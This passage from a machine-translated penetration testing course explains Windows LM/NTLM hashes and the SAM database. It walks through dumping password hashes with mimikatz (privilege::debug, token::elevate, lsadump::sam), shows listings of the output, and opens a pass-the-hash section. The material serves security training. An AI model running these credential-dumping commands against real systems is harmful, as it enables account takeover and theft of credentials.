<div style="position:absolute;top:173165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">盐是一个随机值，与明文密码一起用于计算密码</font></font></nobr></div>
<div style="position:absolute;top:173184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希。</font><font style="vertical-align: inherit;">这可以防止散列查找攻击</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">567</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为密码散列将根据盐而变化</font></font></nobr></div>
<div style="position:absolute;top:173204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">价值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173265;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以在 hash 中存储不同词表的预计算散列值</font></font></i></nobr></div>
<div style="position:absolute;top:173285;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">568</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些表可以消耗 TB 的存储空间，具体取决于</font></font></i></nobr></div>
<div style="position:absolute;top:173304;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预计算密码的数量，但可用于快速映射（看</font></font></i></nobr></div>
<div style="position:absolute;top:173323;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">up) 散列到明文密码。</font><font style="vertical-align: inherit;">加盐增加了随机化</font></font></i></nobr></div>
<div style="position:absolute;top:173343;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">计算实际散列之前的密码值，大大降低了机会</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:173435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">565 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Slashroot，2013 年），https://www.slashroot.in/how-are-passwords-stored-linux-understanding-hashing-shadow-utils</font></font></font></nobr></div>
<div style="position:absolute;top:173455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">566 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（维基百科，2019），https:</font></font><font style="vertical-align: inherit;"> //en.wikipedia.org/wiki/Salt_ </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（密码学）</font></font></font></nobr></div>
<div style="position:absolute;top:173475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">567 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（nets.ec，2012 年），https://nets.ec/Cryptography</font></font></font></nobr></div>
<div style="position:absolute;top:173495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">568 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Hash_table</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:173623;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="147"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 147 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:173656;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:174733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:174733;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:174733;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">588</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:173752;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使该哈希存在于预先计算的表中。</font><font style="vertical-align: inherit;">检查 HashKiller </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">569</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网站为</font></font></i></nobr></div>
<div style="position:absolute;top:173771;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希查找服务的示例。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:173833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们将注意力转向 Windows 目标并讨论各种哈希实现</font></font></nobr></div>
<div style="position:absolute;top:173853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用以及我们如何在评估期间利用它们。</font></font></nobr></div>
<div style="position:absolute;top:173885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 系统上，散列的用户密码存储在安全帐户管理器中</font></font></nobr></div>
<div style="position:absolute;top:173905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（山姆）。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">570</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了阻止离线 SAM 数据库密码攻击，微软引入了 SYSKEY</font></font></nobr></div>
<div style="position:absolute;top:173924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">功能 (Windows NT 4.0 SP3)，部分加密 SAM 文件。</font></font></nobr></div>
<div style="position:absolute;top:173957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于 Windows NT 的操作系统，直到并包括 Windows 2003，存储两种不同的</font></font></nobr></div>
<div style="position:absolute;top:173976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码哈希：LAN Manager (LM)、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">571</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，基于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DES</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">572</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 NT LAN Manager</font></font></nobr></div>
<div style="position:absolute;top:173996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(NTLM), </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">573</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MD4 </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">574</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列。</font><font style="vertical-align: inherit;">众所周知，LAN Manager 非常脆弱，因为密码</font></font></nobr></div>
<div style="position:absolute;top:174015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超过七个字符的字符被分成两个字符串，每个字符串单独散列。</font><font style="vertical-align: inherit;">每个</font></font></nobr></div>
<div style="position:absolute;top:174034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码字符串在散列之前也被转换为大写，此外，LM</font></font></nobr></div>
<div style="position:absolute;top:174053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">散列系统不包括盐，使得散列查找攻击可行。</font></font></nobr></div>
<div style="position:absolute;top:174086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 Windows Vista 开始，操作系统默认禁用 LM 并使用 NTLM，</font></font></nobr></div>
<div style="position:absolute;top:174106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除其他外，区分大小写，支持所有 Unicode 字符，并且不拆分哈希</font></font></nobr></div>
<div style="position:absolute;top:174125;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成更小、更弱的部分。</font><font style="vertical-align: inherit;">但是，存储在 SAM 数据库中的 NTLM 哈希值仍未加盐。</font></font></nobr></div>
<div style="position:absolute;top:174158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得一提的是，SAM数据库不能在操作系统运行时复制</font></font></nobr></div>
<div style="position:absolute;top:174177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为 Windows 内核对文件保持独占文件系统锁。</font><font style="vertical-align: inherit;">然而，我们</font></font></nobr></div>
<div style="position:absolute;top:174196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">575</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（在另一个模块中更深入地覆盖）安装在内存中</font></font></nobr></div>
<div style="position:absolute;top:174216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旨在转储 SAM 哈希的攻击。</font></font></nobr></div>
<div style="position:absolute;top:174249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">除此之外，mimikatz 模块有助于从本地安全系统中提取密码哈希</font></font></nobr></div>
<div style="position:absolute;top:174268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限子系统 (LSASS) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">576</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程内存缓存它们。</font></font></nobr></div>
<div style="position:absolute;top:174301;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于LSASS是在SYSTEM用户下运行的特权进程，我们必须启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz</font></font></font></b></nobr></div>
<div style="position:absolute;top:174320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从管理命令提示符。</font><font style="vertical-align: inherit;">要提取密码哈希，我们必须首先执行两个</font></font></nobr></div>
<div style="position:absolute;top:174340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">第一个是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">privilege::debug</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它启用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SeDebugPrivilege</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问权限</font></font></nobr></div>
<div style="position:absolute;top:174359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要篡改另一个进程。</font><font style="vertical-align: inherit;">如果此命令失败，则 mimikatz 很可能不会</font></font></nobr></div>
<div style="position:absolute;top:174379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以管理权限执行。</font></font></nobr></div>
<div style="position:absolute;top:174411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重要的是要了解 LSASS 是一个 SYSTEM 进程，这意味着它具有更高的</font></font></nobr></div>
<div style="position:absolute;top:174430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限比以管理权限运行的 mimikatz 更高。</font><font style="vertical-align: inherit;">为了解决这个问题，我们可以使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:174450;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">token::elevate</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令将安全令牌从高完整性（管理员）提升到</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:174543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">569 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（HashKiller，2019），https://hashkiller.co.uk/</font></font></font></nobr></div>
<div style="position:absolute;top:174563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">570 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Security_Accounts_Manager</font></font></font></nobr></div>
<div style="position:absolute;top:174583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">571 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/LM_hash</font></font></font></nobr></div>
<div style="position:absolute;top:174603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">572 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Data_Encryption_Standard</font></font></font></nobr></div>
<div style="position:absolute;top:174623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">573 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/NTLM</font></font></font></nobr></div>
<div style="position:absolute;top:174643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">574 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/MD4</font></font></font></nobr></div>
<div style="position:absolute;top:174663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">575 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Dimitrios Slamaris, 2017), https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html</font></font></font></nobr></div>
<div style="position:absolute;top:174683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">576 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:174811;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="148"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 148 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:174844;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:175921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:175921;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:175921;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">589</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:174940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统完整性。</font><font style="vertical-align: inherit;">如果从 SYSTEM shell 启动 mimikatz，则不需要此步骤。</font><font style="vertical-align: inherit;">让我们一步</font></font></nobr></div>
<div style="position:absolute;top:174959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在通过这个过程：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:174994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Tools\password_attacks\mimikatz.exe</font></font></font></b></nobr></div>
<div style="position:absolute;top:175011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:175028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz #</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权::调试</font></font></font></b></nobr></div>
<div style="position:absolute;top:175045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限 '20' OK</font></font></nobr></div>
<div style="position:absolute;top:175079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font><b><font color="#0070c0"><font style="vertical-align: inherit;">token::</font></font></b><font style="vertical-align: inherit;"> elevate</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
<div style="position:absolute;top:175096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌 ID：0</font></font></nobr></div>
<div style="position:absolute;top:175113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户名 ：</font></font></nobr></div>
<div style="position:absolute;top:175130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SID 名称：NT AUTHORITY\SYSTEM</font></font></nobr></div>
<div style="position:absolute;top:175164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">740 {0;000003e7} 1 D 33697    </font></font></nobr></div>
<div style="position:absolute;top:175164;left:433"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT AUTHORITY\SYSTEM S-1-5-18    </font></font></nobr></div>
<div style="position:absolute;top:175164;left:757"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(04g,2</font></font></nobr></div>
<div style="position:absolute;top:175181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1p) 小学</font></font></nobr></div>
<div style="position:absolute;top:175198;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-&gt; 冒充！</font></font></nobr></div>
<div style="position:absolute;top:175215;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 进程令牌：{0;0002e0fe} 1 F 3790250 corp\offsec S-1-5-21-3048852426-32</font></font></nobr></div>
<div style="position:absolute;top:175231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34707088-723452474-1103 (12g,24p) 初级</font></font></nobr></div>
<div style="position:absolute;top:175248;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 线程令牌：{0;000003e7} 1 D 3843007 NT AUTHORITY\SYSTEM S-1-5-18    </font></font></nobr></div>
<div style="position:absolute;top:175265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(04g,21p) 冒充（委托）</font></font></nobr></div>
<div style="position:absolute;top:175285;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 615 - 准备使用 mimikatz 转储 SAM 数据库</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:175343;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">值得注意的是，token 模块可能会列出 (token::list) 并使用</font></font></i></nobr></div>
<div style="position:absolute;top:175363;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(token::elevate) 当前登录到机器的所有用户的令牌，其中</font></font></i></nobr></div>
<div style="position:absolute;top:175382;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">某些情况下可能是其他机器的管理员。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:175444;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::sam</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来转储 SAM 数据库的内容：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:175479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mimikatz # </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsadump::sam</font></font></font></b></nobr></div>
<div style="position:absolute;top:175496;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域名：CLIENT251</font></font></nobr></div>
<div style="position:absolute;top:175513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统密钥：457154fe3c13064d8ce67ff93a9257cf</font></font></nobr></div>
<div style="position:absolute;top:175530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地 SID : S-1-5-21-3426091779-1881636637-1944612440</font></font></nobr></div>
<div style="position:absolute;top:175547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5</font></font></nobr></div>
<div style="position:absolute;top:175581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f4 (500)</font></font></nobr></div>
<div style="position:absolute;top:175598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：管理员</font></font></nobr></div>
<div style="position:absolute;top:175632;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f5 (501)</font></font></nobr></div>
<div style="position:absolute;top:175649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：客人</font></font></nobr></div>
<div style="position:absolute;top:175683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f7 (503)</font></font></nobr></div>
<div style="position:absolute;top:175700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：默认帐户</font></font></nobr></div>
<div style="position:absolute;top:175734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000001f8 (504)</font></font></nobr></div>
<div style="position:absolute;top:175751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户：WDAGUtilityAccount</font></font></nobr></div>
<div style="position:absolute;top:175768;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希 NTLM：0c509cca8bcd12a26acf0d1e508cb028</font></font></nobr></div>
<div style="position:absolute;top:175802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RID : 000003e9 (1001)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:175819;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 : Offsec</font></font></b></nobr></div>
<div style="position:absolute;top:175836;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">哈希 NTLM：2892d26cdf84d7a70e2eb3b9f05c425e</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:175855;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 616 - 使用 mimikatz 转储 SAM 数据库 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:175999;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="149"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 149 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:176032;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:177109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:177109;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:177109;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">590</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们所见，mimikatz 已经按照要求优雅有效地转储了哈希值。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:176190;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他哈希转储工具，包括 pwdump、fgdump、</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">577</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 Windows</font></font></i></nobr></div>
<div style="position:absolute;top:176209;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Credential Editor (wce) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">578</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在旧版 Windows 操作系统上运行良好</font></font></i></nobr></div>
<div style="position:absolute;top:176229;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如 Windows XP 和 Windows Server 2003。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:176291;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176325;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:176358;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 确定您的 Kali 系统中使用的密码哈希版本。</font></font></nobr></div>
<div style="position:absolute;top:176386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 mimikatz 从 Windows 上的 SAM 数据库转储密码哈希</font></font></nobr></div>
<div style="position:absolute;top:176406;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:176440;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">19.4.2</font></font></i></nobr></div>
<div style="position:absolute;top:176440;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Windows 中传递哈希</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:176478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们将在下一节中发现的，破解密码哈希可能非常耗时且</font></font></nobr></div>
<div style="position:absolute;top:176498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果没有强大的硬件，通常是不可行的。</font><font style="vertical-align: inherit;">但是，有时我们可以利用 Windows-</font></font></nobr></div>
<div style="position:absolute;top:176517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于密码哈希，而无需费力的破解过程。</font></font></nobr></div>
<div style="position:absolute;top:176550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传递的散列</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PTH）技术（在1997年发现的）允许攻击者认证到</font></font></nobr></div>
<div style="position:absolute;top:176569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程目标通过使用用户名和 NTLM/LM 哈希的有效组合而不是清除</font></font></nobr></div>
<div style="position:absolute;top:176588;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本密码。</font><font style="vertical-align: inherit;">这是可能的，因为 NTLM/LM 密码哈希没有加盐并保持</font></font></nobr></div>
<div style="position:absolute;top:176608;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话之间的静态。</font><font style="vertical-align: inherit;">此外，如果我们在一个目标上发现密码哈希，我们不能只</font></font></nobr></div>
<div style="position:absolute;top:176627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用它来验证那个目标，我们也可以用它来验证另一个目标，只要</font></font></nobr></div>
